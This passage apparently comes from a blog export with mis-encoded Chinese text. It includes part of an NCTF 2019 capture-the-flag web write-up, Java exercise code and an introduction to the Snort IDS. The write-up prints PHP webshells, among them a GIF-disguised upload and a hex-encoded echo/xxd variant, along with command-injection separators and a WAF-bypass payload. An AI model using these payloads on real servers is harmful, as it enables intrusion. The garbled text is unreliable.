}\n}\n?&gt;</code></pre><p>ä½¿ç”¨å‘½ä»¤æ‹¼æ¥ç»•è¿‡ waf()</p>\n<pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;\n&amp;useful=index.php</code></pre><p>disable_functiongs:</p>\n<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>ä»¤æ‰§è¡Œåˆ©ç”¨åŠç»•è¿‡å§¿åŠ¿ã€€ã€€</p>\n<p>å†™å…¥webshell:</p>\n<p>åˆ©ç”¨å‘½ä»¤æ³¨å…¥å†™ä¸€å¥è¯php webshellåˆ°webç›®å½•æ¶‰åŠåˆ°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰ï¼Œå‡è®¾éœ€è¦å†™å…¥<?php eval($_POST[kang]); ?>ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š<br>WINDOWSï¼šç”¨^è½¬ä¹‰&lt;ï¼Œå³æ‰§è¡Œecho ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>linuxä¸‹éœ€è¦ç”¨\\æ¥è½¬ä¹‰&lt;ï¼Œä¸è¿‡å¾ˆå¤šphpéƒ½é»˜è®¤å¼€å¯gpcï¼ˆé­”æœ¯å¼•å·magic_quotes_gpc()ï¼‰ã€‚å¯ä»¥å…ˆç”¨16è¿›åˆ¶è½¬æ¢ä¸€å¥è¯å†ç”¨xxdå‘½ä»¤æŠŠ16è¿›åˆ¶è¿˜åŸï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>| å‘½ä»¤ç®¡é“ç¬¦</p>\n<p>&lt;&gt;&gt;&gt; æ–‡ä»¶é‡å®šå‘ç¬¦</p>\n<p>æµ‹è¯•ï¼š 0 | dir c:</p>\n<p>ã€€ã€€ä»£ç åªè¿‡æ»¤äº†éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥è€ƒè™‘ç”¨å…¶ä»–å­—ç¬¦è¿›è¡Œæµ‹è¯•ï¼Œè¿™è¾¹åˆ—ä¸¾ä¸€ä¸‹Window/Linuxå¯åˆ©ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<p>windowsæ”¯æŒï¼š</p>\n<p>|     ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥      ping 127.0.0.1|whoami          </p>\n<p>||    å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡       ping  2 || whoami </p>\n<p>&amp;   å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡                       ping 127.0.0.1&amp;whoami</p>\n<p>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ    ping 127.0.0.1&amp;&amp;whoami</p>\n<p>Linuxæ”¯æŒ(æ¯”ä¸Šé¢å¤šä¸€ä¸ª):</p>\n<p>;     å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„      ping 127.0.0.1;whoami  </p>\n<h3 id=\"upload-your-shell\"><a href=\"#upload-your-shell\" class=\"headerlink\" title=\"upload your shell\"></a>upload your shell</h3><p>æ‰“å¼€é¢˜ç›®åœ¨å¤´åƒé‚£é‡Œå¾— image æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œå…ˆä¸Šä¼ </p>\n<pre><code>&lt;?php \n    @eval($_POST[shell]);\n     ?&gt;</code></pre><p>æç¤º <code>&lt;?</code> ï¼Œç„¶åç›´æ¥æ‹¿ä¸Šæ¬¡ SUCTF ç”¨å‰©ä¸‹å¾—é©¬</p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    #system(&apos;cat /flag&apos;);\n    @eval($_POST[shell]);\n&lt;/script&gt;</code></pre><p>ç„¶åå†ä¿®æ”¹ content-type ï¼Œä¼ å®Œå¾—åˆ°å›¾ç‰‡è·¯å¾„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œè§‚å¯Ÿåˆ°é“¾æ¥ä¸º </p>\n<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>äºæ˜¯è®¿é—®</p>\n<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>å³å¯</p>\n<h3 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h3><p>æ–‡å­—æ›¿æ¢å·¥å…·ï¼Œhintï¼š<code>ä½¿ç”¨php5.6+bootstrapè¿›è¡Œå¼€å‘</code> ï¼ŒçŒœæµ‹ <code>preg_replace</code> çš„ <code>/e</code> ä»£ç æ‰§è¡Œã€‚</p>\n<p>ç¬¬ä¸‰ä¸ªæ¡†å†…çš„å†…å®¹åº”è¯¥å°±æ˜¯ /eçš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬è¾“å…¥ <code>var_dump(111)</code> ï¼ŒæˆåŠŸæ‰“å° <code>int(111)</code> ï¼Œè¾“å…¥å•å¼•å·åŒå¼•å·éƒ½ä¼šè¢«è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨ chr() æ¥ç»•è¿‡ã€‚</p>\n<p>æˆ‘ä»¬è¾“å…¥scandir(chr(47)) å‘ç°åˆ—ä¸äº†ç›®å½•ã€‚ç›´æ¥è¯»æ–‡ä»¶ </p>\n<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>","text":"NCTF11/26/2019 8:45:31 PM WEBFake XML cookbookç®€å•çš„xxe&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"java","slug":"java-tests","date":"2019-11-26T01:26:49.000Z","updated":"2019-12-01T12:59:07.431Z","comments":true,"path":"api/articles/java-tests.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"java-tests\"><a href=\"#java-tests\" class=\"headerlink\" title=\"java-tests\"></a>java-tests</h1><p>11/26/2019 9:26:49 AM </p>\n<h2 id=\"charper-two\"><a href=\"#charper-two\" class=\"headerlink\" title=\"charper two\"></a>charper two</h2><ul>\n<li>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºé˜¶ä¹˜æœ€å³è¾¹çš„é0æ•°å­—</li>\n</ul>\n<pre><code>package the_second_chapter;\n\nimport java.math.BigInteger;\nimport java.util.Scanner;\n\npublic class first_one {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    //int sum = 0,temp = 1;\n    BigInteger num = new BigInteger(&quot;1&quot;);\n    System.out.println(&quot;ä½ æƒ³ç®—å¤šå°‘çš„é˜¶ä¹˜?&quot;);\n    Scanner scn = null;//é˜²æ­¢ Scanner is never closed çš„é”™è¯¯\n    try {\n        scn = new Scanner(System.in);\n        int num1 = scn.nextInt();\n        for(int number=1;number&lt;=num1;number++)\n        {\n            num = num.multiply(new BigInteger(number + &quot;&quot;));\n        }\n        System.out.println(num);\n    }\n    finally {\n        if(scn!=null)\n            scn.close();\n    }\n    char[] c = num.toString().toCharArray();              \n    System.out.println(num.toString().length());        //è¾“å‡ºé•¿åº¦\n    for(int b=num.toString().length()-1;b&gt;=0;b--) {        //åˆ¤æ–­é0\n        if(c[b]!=&apos;0&apos;) {\n            System.out.println(c[b]);\n            return;\n        }\n    }\n}\n\n}</code></pre><blockquote>\n<p>String.ToCharArray Method</p>\n<p>Definition</p>\n<p>Namespace: System</p>\n<p>Assemblies: System.Runtime.dll, mscorlib.dll, netstandard.dll</p>\n<p>Copies the characters in this instance(å®ä¾‹) to a Unicode character array.</p>\n<p><a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8</a></p>\n</blockquote>\n<ul>\n<li>è¾“å…¥ä¸€ç»„æ•°å­—ä¿å­˜åœ¨æ•°ç»„ä¸­ï¼Œé‡åˆ°0è¡¨ç¤ºè¾“å…¥ç»“æŸï¼Œå°†è¾“å…¥çš„æ•°ç»„é€†åºè¾“å‡º</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\n\npublic class test_9 {\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner input=new Scanner(System.in);\n    int[] num=new int[20];\n    int i;\n    for(i=0;;i++)\n    {\n        int a=input.nextInt();\n        if(a==0)\n            break;\n        num[i]=a;\n    }\n    for(i=i-1;i&gt;=0;i--)\n    {\n        System.out.print(num[i]);\n        if(i!=0)\n            System.out.print(&quot; &quot;);\n    }\n    System.out.println();\n}\n}</code></pre><ul>\n<li>è¶…çº§é€’å¢åºåˆ—</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\n\npublic class test_10 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scn = new Scanner(System.in);\n    int[] num = new int[20];\n    int i,flag=0;\n    int sum=0;\n    for(i=0;;i++) {\n        int a = scn.nextInt();\n        if(a==-999)\n            break;\n        num[i] = a;\n    }\n    for(int j=0;j&lt;num.length;j++) {\n        sum += num[j];\n        if(sum&lt;num[j+1])\n            flag=1;\n        else {\n            flag=2;\n            break;\n        }\n    if(flag==1) {\n        System.out.print(&quot;è¶…çº§é€’å¢ï¼&quot;);\n\n    }\n    else {\n        System.out.print(&quot;ä¸æ˜¯è¶…çº§é€’å¢&quot;);\n    }\n    }\n}\n\n}</code></pre><ul>\n<li>ç»Ÿè®¡å­—ç¬¦ä¸²ä¸­å•è¯ä¸ªæ•°</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\npublic class test_11 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scanner = new Scanner(System.in);\n    String s = scanner.nextLine();\n    String []arr = s.split(&quot; &quot;);\n    int count = 0;\n    for (int i = 0;i&lt;arr.length;i++){\n        for (int j = i+1;j&lt;arr.length;j++){\n            if (arr[i].equals( arr[j])){\n                arr[j] = &quot; &quot;;\n            }\n        }\n    }\n    for (int i = 0;i&lt;arr.length;i++){\n        System.out.println(arr[i]);\n    }\n    for (int i = 0;i&lt;arr.length;i++){\n        if (arr[i] != &quot; &quot;){\n            count++;\n        }\n    }\n    System.out.println(count);\n}\n\n}</code></pre><h2 id=\"third-chapter\"><a href=\"#third-chapter\" class=\"headerlink\" title=\"third_chapter\"></a>third_chapter</h2><ul>\n<li>ä¿®æ”¹æ–‡ä»¶åç§°</li>\n</ul>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\npublic class test_4 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scn = new Scanner(System.in);\n    System.out.print(&quot;è¯·è¾“å…¥æ—§æ–‡ä»¶è·¯å¾„åŠåç§°(D:\\\\test.txt)ï¼š&quot;);\n    String old_path = scn.next();\n    File old_file = new File(old_path);\n    System.out.print(&quot;è¯·è¾“å…¥æ–°æ–‡ä»¶åç§°(D:\\\\test1.txt)ï¼š&quot;);\n    String new_path = scn.next();\n    File new_file = new File(new_path);\n    if(old_file.exists() &amp;&amp; !new_file.exists()) {\n        old_file.renameTo(new_file);\n        System.out.print(&quot;reanme successful!&quot;);\n    }\n    else {\n        System.out.print(&quot;rename failue!&quot;);\n    }\n}\n\n}</code></pre><ul>\n<li><p>å®ç°copyå‘½ä»¤</p>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\npublic class test_6 {\n\npublic static void main(String[] args) throws FileNotFoundException {\n    // TODO Auto-generated method stub\n    try {\n    Scanner scn = new Scanner(System.in);\n    //è¾“å…¥æ–‡ä»¶å\n    System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);\n    String old_file = scn.next();\n    FileReader old_one = new FileReader(old_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡\n    BufferedReader old_one_cont = new BufferedReader(old_one);//è¯»æ–‡ä»¶\n    System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶åˆ°çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);\n    String new_file = scn.next();\n    FileWriter new_one = new FileWriter(new_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡\n    BufferedWriter new_one_cont = new BufferedWriter(new_one);//è¯»æ–‡ä»¶\n    String content = null;\n    while((content = old_one_cont.readLine())!=null) {\n        new_one_cont.write(content);\n        new_one_cont.newLine();\n    }\n    //å…³é—­æ–‡ä»¶\n    new_one_cont.flush();\n    new_one_cont.close();\n    new_one.close();\n\n    }\n    catch(IOException e) {\n        System.out.print(e.toString());\n    }\n}\n\n}</code></pre></li>\n</ul>\n<ul>\n<li><p>å®ç°åˆ é™¤æ³¨é‡ŠåŠŸèƒ½</p>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\n/**\n * @author brian\n *\n * @date: 2019å¹´12æœˆ1æ—¥ ä¸Šåˆ10:57:42\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\npublic class test_8 {\n\n    /**\n     * @param args\n     * @throws FileNotFoundException \n     */\n    public static void main(String[] args) throws FileNotFoundException {\n        // TODO Auto-generated method stub\n        try {\n        Scanner scn = new Scanner(System.in);\n        System.out.println(&quot;è¯·è¾“å…¥è¦åˆ é™¤æ³¨é‡Šçš„æ–‡ä»¶è·¯å¾„åŠæ–‡ä»¶åï¼š&quot;);\n        String old_file = scn.next();\n        FileReader old_one = new FileReader(old_file);\n        BufferedReader old_cont = new BufferedReader(old_one);\n        System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶åˆ°çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);\n        String new_file = scn.next();\n        FileWriter new_one = new FileWriter(new_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡\n        BufferedWriter new_one_cont = new BufferedWriter(new_one);//è¯»æ–‡ä»¶\n        String content = null;\n        while((content = old_cont.readLine())!=null) {\n            /**åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨é‡Š\n             * trim(): å°†è°ƒç”¨è¯¥æ–¹æ³•çš„Stringçš„å‰åç©ºæ ¼åˆ é™¤ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²\n             * indexOf(): æŸ¥æ‰¾å‚æ•°å­—ç¬¦ä¸²åœ¨è°ƒç”¨æ”¹æ–¹æ³•çš„Stringä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå‚æ•°å­—ç¬¦ä¸²ä¸å­˜åœ¨è¿”å›-1\n             * &amp; ï¼šä¸è¿ç®—ï¼Œä¸¤è¾¹éƒ½æ˜¯trueæ—¶ç»“æœä¸ºtrue\n             * | ï¼šæˆ–è¿ç®—ï¼Œä¸¤è¾¹ä»»æ„ä¸€ä¸ªä¸ºtrueï¼Œç»“æœä¸ºtrueï¼Œéƒ½ä¸æ˜¯trueï¼Œç»“æœä¸ºfalse\n             */\n            if((content.trim().indexOf(&quot;//&quot;)==-1)&amp;(content.trim().indexOf(&quot;/*&quot;)==-1)&amp;(content.trim().indexOf(&quot;*/&quot;)==-1)) {\n                System.out.println(content);\n                new_one_cont.write(content);\n                new_one_cont.newLine();\n            }\n                //System.out.print(content+&quot;\\n&quot;);\n        }\n        //å…³é—­æ–‡ä»¶\n        new_one_cont.flush();\n        new_one_cont.close();\n        new_one.close();\n    } catch (IOException e) {\n            // TODO Auto-generated catch block\n        e.printStackTrace();\n    }\n}\n\n}</code></pre></li>\n</ul>\n<h2 id=\"six-chapter\"><a href=\"#six-chapter\" class=\"headerlink\" title=\"six_chapter\"></a>six_chapter</h2><ul>\n<li><p>å¤šçº¿ç¨‹æ‰“å°çº¿ç¨‹å·</p>\n<pre><code>package sixth_chapter;\n\n/**\n * @author brian\n *\n * @date: 2019å¹´12æœˆ1æ—¥ ä¸‹åˆ7:50:35\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\npublic class SecondThread implements Runnable{\n\n    /**\n     * @param args\n     */\n    public void run() {\n        for(int i=0;i&lt;5;i++) {\n\n            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+(char)(i+&apos;A&apos;));\n            try {\n                Thread.sleep(700);\n            }\n            catch(InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    public static void main(String[] args) {\n        // TODO Auto-generated method stub\n\n    }\n\n}</code></pre></li>\n</ul>\n<pre><code>package sixth_chapter;\n//import FitstThread;\n//import SecondThread;\n\n/**\n * @author brian\n *\n * @date: 2019å¹´12æœˆ1æ—¥ ä¸‹åˆ7:19:12\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\n\n\npublic class test_4 {\n\n    /**\n     * @param args\n     */\n    public static void main(String[] args) {\n        // TODO Auto-generated method stub\n        Runnable target = new SecondThread();\n        Thread t1 = new Thread(target);\n        Thread t2 = new Thread(target);\n        for(int i=0;i&lt;10;i++) {\n            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+i);\n            try {\n                Thread.sleep(700);\n            }\n            catch(InterruptedException e) {\n                e.printStackTrace();\n            }\n            if(i==1) t1.start();\n            if(i==2) t2.start();\n        }\n    }\n\n}</code></pre><ul>\n<li>çº¿ç¨‹äº’æ–¥</li>\n</ul>\n","text":"java-tests11/26/2019 9:26:49 AM charper twoè¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºé˜¶ä¹˜æœ€å³è¾¹çš„é0æ•°å­—package the_second_chapter;import java.math.BigInteger;import java.util.Scanne","link":"","raw":null,"photos":[],"categories":[{"name":"java","slug":"java","count":1,"path":"api/categories/java.json"}],"tags":[{"name":"java's things","slug":"java-s-things","count":1,"path":"api/tags/java-s-things.json"}]},{"title":"snort å®‰å…¨é˜²å¾¡","slug":"snort-å®‰å…¨é˜²å¾¡","date":"2019-11-24T14:57:59.000Z","updated":"2019-12-01T12:57:42.268Z","comments":true,"path":"api/articles/snort-å®‰å…¨é˜²å¾¡.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"å®‰å…¨é˜²å¾¡-snort\"><a href=\"#å®‰å…¨é˜²å¾¡-snort\" class=\"headerlink\" title=\"å®‰å…¨é˜²å¾¡-snort\"></a>å®‰å…¨é˜²å¾¡-snort</h1><p>Snort IDSï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚å®ƒå…·æœ‰å®æ—¶æ•°æ®æµé‡åˆ†æå’Œè®°å½•IPç½‘ç»œæ•°æ®åŒ…çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿›è¡Œåè®®åˆ†æï¼Œå¯¹ç½‘ç»œæ•°æ®åŒ…å†…å®¹è¿›è¡Œæœç´¢/åŒ¹é…ã€‚å®ƒèƒ½å¤Ÿæ£€æµ‹å„ç§ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼Œå¯¹æ”»å‡»è¿›è¡Œå®æ—¶æŠ¥è­¦ã€‚æ­¤å¤–ï¼ŒSnortæ˜¯å¼€æºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¹¶å…·æœ‰å¾ˆå¥½çš„æ‰©å±•æ€§å’Œå¯ç§»æ¤æ€§ã€‚</p>\n<h2 id=\"Snort-ç®€ä»‹\"><a href=\"#Snort-ç®€ä»‹\" class=\"headerlink\" title=\"Snort ç®€ä»‹\"></a>Snort ç®€ä»‹</h2><h3 id=\"snortä½“ç³»ç»“æ„\"><a href=\"#snortä½“ç³»ç»“æ„\" class=\"headerlink\" title=\"snortä½“ç³»ç»“æ„\"></a>snortä½“ç³»ç»“æ„</h3><p>Snortçš„ç»“æ„ç”±4å¤§è½¯ä»¶æ¨¡å—ç»„æˆï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p>\n<ol>\n<li>æ•°æ®åŒ…å—…æ¢æ¨¡å—â€”â€”è´Ÿè´£ç›‘å¬ç½‘ç»œæ•°æ®åŒ…ï¼Œå¯¹ç½‘ç»œè¿›è¡Œåˆ†ï¼›</li>\n<li>é¢„å¤„ç†æ¨¡å—â€”â€”è¯¥æ¨¡å—ç”¨ç›¸åº”çš„æ’ä»¶æ¥æ£€æŸ¥åŸå§‹æ•°æ®åŒ…ï¼Œä»ä¸­å‘ç°åŸå§‹æ•°æ®çš„â€œè¡Œä¸ºâ€ï¼Œå¦‚ç«¯å£æ‰«æï¼ŒIPç¢ç‰‡ç­‰ï¼Œæ•°æ®åŒ…ç»è¿‡é¢„å¤„ç†åæ‰ä¼ åˆ°æ£€æµ‹å¼•æ“ï¼›</li>\n<li>æ£€æµ‹æ¨¡å—â€”â€”è¯¥æ¨¡å—æ˜¯Snortçš„æ ¸å¿ƒæ¨¡å—ã€‚å½“æ•°æ®åŒ…ä»é¢„å¤„ç†å™¨é€è¿‡æ¥åï¼Œæ£€æµ‹å¼•æ“ä¾æ®é¢„å…ˆè®¾ç½®çš„è§„åˆ™æ£€æŸ¥æ•°æ®åŒ…ï¼Œä¸€æ—¦å‘ç°æ•°æ®åŒ…ä¸­çš„å†…å®¹å’ŒæŸæ¡è§„åˆ™ç›¸åŒ¹é…ï¼Œå°±é€šçŸ¥æŠ¥è­¦æ¨¡å—ï¼›</li>\n<li>æŠ¥è­¦/æ—¥å¿—æ¨¡å—â€”â€”ç»æ£€æµ‹å¼•æ“æ£€æŸ¥åçš„Snortæ•°æ®éœ€è¦ä»¥æŸç§æ–¹å¼è¾“å‡ºã€‚å¦‚æœæ£€æµ‹å¼•æ“ä¸­çš„æŸæ¡è§„åˆ™è¢«åŒ¹é…ï¼Œåˆ™ä¼šè§¦å‘ä¸€æ¡æŠ¥è­¦ï¼Œè¿™æ¡æŠ¥è­¦ä¿¡æ¯ä¼šé€šè¿‡ç½‘ç»œã€UNIXsocketã€WindowsPopu(SMB)ã€SNMPåè®®çš„trapå‘½ä»¤ä¼ é€ç»™æ—¥å¿—æ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥å°†æŠ¥è­¦ä¼ é€ç»™ç¬¬ä¸‰æ–¹æ’ä»¶ï¼ˆå¦‚SnortSamï¼‰ï¼Œå¦å¤–æŠ¥è­¦ä¿¡æ¯ä¹Ÿå¯ä»¥è®°å…¥SQLæ•°æ®åº“ã€‚</li>\n</ol>\n<h3 id=\"snortä¸‰ç§å·¥ä½œæ–¹å¼\"><a href=\"#snortä¸‰ç§å·¥ä½œæ–¹å¼\" class=\"headerlink\" title=\"snortä¸‰ç§å·¥ä½œæ–¹å¼\"></a>snortä¸‰ç§å·¥ä½œæ–¹å¼</h3><p>Snortæ‹¥æœ‰ä¸‰å¤§åŸºæœ¬åŠŸèƒ½ï¼šå—…æ¢å™¨ã€æ•°æ®åŒ…è®°å½•å™¨å’Œå…¥ä¾µæ£€æµ‹ã€‚</p>\n<ol>\n<li>å—…æ¢å™¨æ¨¡å¼ä»…ä»ç½‘ç»œä¸Šè¯»å–æ•°æ®åŒ…å¹¶ä½œä¸ºè¿ç»­ä¸æ–­çš„æµæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šï¼Œå¸¸ç”¨å‘½ä»¤snort -vã€‚ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å°†ä½¿snortåªè¾“å‡ºIP/TCP/UDP/ICMPçš„åŒ…å¤´ä¿¡æ¯</li>\n<li>æ•°æ®åŒ…è®°å½•å™¨æ¨¡å¼æ˜¯æŠŠæ•°æ®åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸Šï¼Œå¸¸ç”¨å‘½ä»¤snort â€“l æŒ‡å®šä¸€ä¸ªç›®å½•ã€‚è¿™ä¼šå°†æ‰€æœ‰çš„åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸Šã€‚</li>\n<li>ç½‘ç»œå…¥ä¾µæ£€æµ‹æ¨¡å¼æ˜¯æœ€å¤æ‚çš„ï¼Œè€Œä¸”æ˜¯å¯é…ç½®çš„ã€‚æˆ‘ä»¬å¯ä»¥è®©Snortåˆ†æç½‘ç»œæ•°æ®æµä»¥åŒ¹é…ç”¨æˆ·å®šä¹‰çš„ä¸€äº›è§„åˆ™ï¼Œå¹¶æ ¹æ®æ£€æµ‹ç»“æœé‡‡å–ä¸€å®šçš„åŠ¨ä½œã€‚</li>\n</ol>\n<h2 id=\"å¦‚ä½•ä½¿ç”¨0x01\"><a href=\"#å¦‚ä½•ä½¿ç”¨0x01\" class=\"headerlink\" title=\"å¦‚ä½•ä½¿ç”¨0x01\"></a>å¦‚ä½•ä½¿ç”¨0x01</h2><h3 id=\"snort-è§„åˆ™å®šä¹‰\"><a href=\"#snort-è§„åˆ™å®šä¹‰\" class=\"headerlink\" title=\"snort è§„åˆ™å®šä¹‰\"></a>snort è§„åˆ™å®šä¹‰</h3><p>Snortä½¿ç”¨ä¸€ç§ç®€å•çš„è§„åˆ™æè¿°è¯­è¨€ï¼Œè¿™ç§æè¿°è¯­è¨€æ˜“äºæ‰©å±•ï¼ŒåŠŸèƒ½ä¹Ÿæ¯”è¾ƒå¼ºå¤§ã€‚<br>Snortè§„åˆ™æ˜¯åŸºäºæ–‡æœ¬çš„ï¼Œè§„åˆ™æ–‡ä»¶æŒ‰ç…§ä¸åŒçš„ç»„è¿›è¡Œåˆ†ç±»ï¼Œæ¯”å¦‚ï¼Œæ–‡ä»¶<code>ftp.rules</code>åŒ…å«äº†FTPæ”»å‡»å†…å®¹ã€‚<br>ã€Œæ³¨ã€Snortçš„æ¯æ¡è§„åˆ™å¿…é¡»åœ¨ä¸€è¡Œä¸­ï¼Œå®ƒçš„è§„åˆ™è§£é‡Šå™¨æ— æ³•å¯¹è·¨è¡Œçš„è§„åˆ™è¿›è¡Œè§£æã€‚Snortçš„æ¯æ¡è§„åˆ™éƒ½å¯ä»¥åˆ†æˆé€»è¾‘ä¸Šçš„ä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>è§„åˆ™å¤´å’Œè§„åˆ™ä½“</strong>ã€‚</p>\n<p>è§„åˆ™å¤´åŒ…æ‹¬4ä¸ªéƒ¨åˆ†ï¼š<strong>è§„åˆ™è¡Œä¸ºï¼›åè®®ï¼›æºä¿¡æ¯ï¼›ç›®çš„ä¿¡æ¯</strong>ã€‚</p>\n<p>snortè§„åˆ™å¤´Snorté¢„ç½®çš„è§„åˆ™åŠ¨ä½œæœ‰5ç§ï¼š</p>\n<ol>\n<li>passâ€”åŠ¨ä½œé€‰é¡¹passå°†å¿½ç•¥å½“å‰çš„åŒ…ï¼Œåç»§æ•è·çš„åŒ…å°†è¢«ç»§ç»­åˆ†æã€‚</li>\n<li>logâ€”åŠ¨ä½œé€‰é¡¹logå°†æŒ‰ç…§è‡ªå·±é…ç½®çš„æ ¼å¼è®°å½•åŒ…ã€‚</li>\n<li>alertâ€”åŠ¨ä½œé€‰é¡¹alertå°†æŒ‰ç…§è‡ªå·±é…ç½®çš„æ ¼å¼è®°å½•åŒ…ï¼Œç„¶åè¿›è¡ŒæŠ¥è­¦ã€‚å®ƒçš„åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯å¿…é¡»æ°å½“çš„ç”¨ï¼Œå› ä¸ºå¦‚æœæŠ¥è­¦è®°å½•è¿‡å¤šï¼Œä»ä¸­æ”«å–æœ‰æ•ˆä¿¡æ¯çš„å·¥ä½œé‡å¢å¤§ï¼Œåè€Œä¼šä½¿å®‰å…¨é˜²æŠ¤å·¥ä½œå˜å¾—ä½æ•ˆã€‚</li>\n<li>dynamicâ€”åŠ¨ä½œé€‰é¡¹dynamicæ˜¯æ¯”è¾ƒç‹¬ç‰¹çš„ä¸€ç§ï¼Œå®ƒä¿æŒåœ¨ä¸€ç§æ½œä¼çŠ¶æ€ï¼Œç›´åˆ°activateç±»å‹çš„è§„åˆ™å°†å…¶è§¦å‘ï¼Œä¹‹åå®ƒå°†åƒlogåŠ¨ä½œä¸€æ 